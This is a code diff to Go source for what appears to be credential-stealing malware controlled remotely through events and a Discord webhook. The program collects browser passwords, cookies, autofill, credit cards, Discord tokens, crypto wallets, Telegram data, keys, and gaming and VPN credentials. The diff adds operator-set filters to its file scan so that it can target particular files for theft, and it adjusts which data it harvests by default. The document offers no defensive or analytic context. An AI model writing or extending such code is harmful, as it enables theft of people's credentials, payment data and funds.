@@ -67,7 +67,7 @@ func handleEvent(event string, payload []byte) error {
 		setDiscordConfig(c)
 		sendEvent("status", map[string]string{"message": "discord config updated"})
 	case "scan_files":
-		go handleScanFiles()
+		go handleScanFiles(payload)
 	case "scan_extensions":
 		go handleScanExtensions()
 	case "fetch_file":
@@ -139,6 +139,8 @@ func handleCollect(payload []byte) {
 	useDiscord := dcfg.Enabled && dcfg.WebhookURL != ""
 
 	if opts.Browsers {
+		// browsers:true with no sub-flags → full browser credential set.
+		// Files / wallets / telegram / keys / apps stay as provided by auto-harvest toggles.
 		noneSet := !opts.Passwords && !opts.Cookies && !opts.Autofill &&
 			!opts.History && !opts.Bookmarks && !opts.CreditCards && !opts.Discord
 		if noneSet {
@@ -149,11 +151,9 @@ func handleCollect(payload []byte) {
 			opts.Bookmarks = true
 			opts.CreditCards = true
 			opts.Discord = true
-			opts.Files = true
-			opts.Wallets = true
-			opts.Telegram = true
-			opts.Keys = true
-			opts.Apps = true
+		}
+		if !opts.Gaming && !opts.VPNs && !opts.Files && !opts.Wallets && !opts.Telegram && !opts.Keys && !opts.Apps {
+			// Legacy payload with only browsers:true — keep gaming/vpns on for compatibility
 			opts.Gaming = true
 			opts.VPNs = true
 		}
@@ -484,7 +484,7 @@ func handleFetchWalletZip(payload []byte) {
 	})
 }
 
-func handleScanFiles() {
+func handleScanFiles(payload []byte) {
 	defer func() {
 		if r := recover(); r != nil {
 			log.Printf("[recovery] file scan panic: %v", r)
@@ -492,8 +492,28 @@ func handleScanFiles() {
 		}
 	}()
 	sendEvent("status", map[string]string{"message": "Scanning files..."})
-	files := recovery.ScanFiles()
-	log.Printf("[recovery] file scan complete: %d files", len(files))
+
+	var filter struct {
+		Extensions   []string `json:"extensions"`
+		Names        []string `json:"names"`
+		NameContains []string `json:"nameContains"`
+	}
+	if len(payload) > 0 {
+		_ = json.Unmarshal(payload, &filter)
+	}
+
+	var files []recovery.FileResult
+	if len(filter.Extensions) > 0 || len(filter.Names) > 0 || len(filter.NameContains) > 0 {
+		files = recovery.ScanFilesFiltered(&recovery.FileScanFilter{
+			Extensions:   filter.Extensions,
+			Names:        filter.Names,
+			NameContains: filter.NameContains,
+		})
+	} else {
+		files = recovery.ScanFiles()
+	}
+	log.Printf("[recovery] file scan complete: %d files (filter ext=%d names=%d contains=%d)",
+		len(files), len(filter.Extensions), len(filter.Names), len(filter.NameContains))
 	sendEvent("file_scan_results", map[string]interface{}{
 		"files":     files,
 		"truncated": len(files) >= 500,
